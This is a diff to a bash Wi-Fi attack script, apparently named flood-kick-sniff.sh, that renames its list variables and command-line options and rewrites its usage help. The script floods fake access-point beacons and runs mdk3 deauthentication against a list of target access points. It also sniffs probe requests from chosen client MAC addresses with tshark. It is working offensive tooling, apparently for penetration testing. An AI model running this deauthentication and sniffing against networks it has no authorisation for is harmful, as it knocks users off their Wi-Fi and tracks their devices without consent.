@@ -3,8 +3,8 @@
 initialise='true'
 delay='15'
 beacon_list='beacon-list' # beacon list taken from https://github.com/wifiphisher/wifiphisher/blob/master/wifiphisher/data/wifiphisher-known-open-wlans
-kill_list='kill-list' # mac address list of access points to deauth
-mac_list='mac-list' # sniff targeted probe requests from specifically this mac address list of clients
+ap_list='ap-list' # mac address list of access points to deauth
+client_list='client-list' # sniff targeted probe requests from specifically this mac address list of clients
 ghz2='1 2 3 4 5 6 7 8 9 10 11 12 13'
 ghz5='36 38 40 42 44 46 48 50 52 54 56 58 60 62 64 100 102 104 106 108 110 112 116 132 134 136 138 140 142 144 149 151 153 155 157 159 161 165'
 channels=$ghz2
@@ -97,7 +97,7 @@ flood() {
 deauth() {
 	if [[ $deauthentication = 'true' ]]
 	then
-		mdk3 $deauth_interface d -b $kill_list$deauth_channels > /dev/null 2>&1 &
+		mdk3 $deauth_interface d -b $ap_list$deauth_channels > /dev/null 2>&1 &
 	fi
 }
 
@@ -105,7 +105,7 @@ filter() {
 	if [[ $target_macs = 'true' ]]
 	then
         	# formatting the client mac list for the tshark command
-		macs=$(cat $mac_list | tr '\n' ' ' | sed 's/.$//' | sed 's/ / || wlan.ta == /g' | sed 's/^/ and wlan.ta == /')
+		macs=$(cat $client_list | tr '\n' ' ' | sed 's/.$//' | sed 's/ / || wlan.ta == /g' | sed 's/^/ and wlan.ta == /')
 	fi
 }
 
@@ -115,32 +115,38 @@ cleanup() {
 }
 
 usage() {
-	echo	"usage: $0 [-afhsx] [-D interface] [-b file] [-c channel(s)] [-C channel(s)] [-i interface] [-K file] [-m file] [-t number]"
-	echo	"	-a		enable client mac address filtering"
-	echo	"	-f		enable beacon flooding"
-	echo	"	-h		enable channel hopping"
-	echo	"	-s		enable probe sniffing"
-	echo	"	-x		disable initialisation"
-	echo	"	-i <interface>	specify primary interface for flooding / hopping / sniffing"
-	echo	"	-c <channel(s)>	specify primary interface channel(s), default = 2 GHz spectrum, \"5ghz\" = 5 GHz spectrum, \"all\" = all, or list channels e.g. \"1 3 7\""
-	echo	"	-D <interface>	enable deauthentication on specified secondary interface"
-	echo	"	-C <channel(s)>	specify secondary interface channel(s)"
-	echo	"	-b <file>	specify beacon list, default is ./beacon-list"
-	echo	"	-K <file>	specify kill list, default is ./kill-list"
-	echo	"	-m <file>	specify client list, default is ./mac-list"
-	echo	"	-r <number>	beacon flood rate per second, default = 50"
-	echo	"	-t <number>	time in seconds between channel hopping, default = 15"
-	echo	"example: $0 -afhs -b /tmp/beacon.list -c \"1 3 5 7 9 11\" -i wlan0 -m /tmp/client.list -t 30 -r 25 -D wlan1 -C \"1 6 11\" -K /tmp/kill.list"
+	echo	usage: $0 [-Ufhsx] [-i interface] [-c channel(s)] [-b file] [-u file] [-t number] [-I interface] [-C channel(s)] [-a file]
+	echo
+	echo		-x		disable initialisation (airmon-ng check kill, ifconfig wlan0 down/up, etc.)
+	echo
+	echo	[*] interface 1
+	echo		-i <interface>	specify the primary interface for flooding / hopping / sniffing
+	echo		-c <channel(s)>	specify primary interface channel(s) (default = 2 GHz spectrum. "5ghz" = 5 GHz spectrum. "all" = all. list channels e.g. "1 3 7")
+	echo		-f		enable beacon flooding
+	echo		-h		enable channel hopping
+	echo		-s		enable probe sniffing
+	echo		-U		filter output for only clients in the client mac address list
+	echo		-r <number>	beacon flood rate per second (default = 50)
+	echo		-t <number>	time in seconds between channel hopping (default = 15)
+	echo		-u <file>	specify non-default client list (default is ./client-list)
+	echo		-b <file>	specify non-default beacon list (default is ./beacon-list)
+	echo
+	echo	[*] interface 2
+	echo		-I <interface>	enable deauthentication on specified secondary interface
+	echo		-C <channel(s)>	specify secondary interface channel(s)
+	echo		-a <file>	specify non-default ap list (default is ./ap-list)
+	echo
+	echo	example: ./flood-kick-sniff.sh -Ufhs -b /jobs/corp/beacon.list -c "1 3 5 7 9 11" -i wlan0 -u /jobs/corp/client.list -t 30 -r 25 -I wlan1 -C "1 6 11" -a /jobs/corp/ap.list
 	exit 1
 }
 
-while getopts D:afhsb:c:C:i:K:m:r:t:x option
+while getopts I:Ufhsb:c:C:i:a:u:r:t:x option
 do
 	case $option in
-		a)
+		U)
 			target_macs='true'
 		;;
-		D)
+		I)
 			deauth_interface=$OPTARG
 			deauthentication='true'
 			deauth_head='DEAUTHENTICATING '
@@ -185,11 +191,11 @@ do
 		i)
 			interface=$OPTARG
 		;;
-		K)
-			kill_list="$OPTARG"
+		a)
+			ap_list="$OPTARG"
 		;;
-		m)
-			mac_list="$OPTARG"
+		u)
+			client_list="$OPTARG"
 		;;
 		r)
 			rate=" -s $OPTARG"
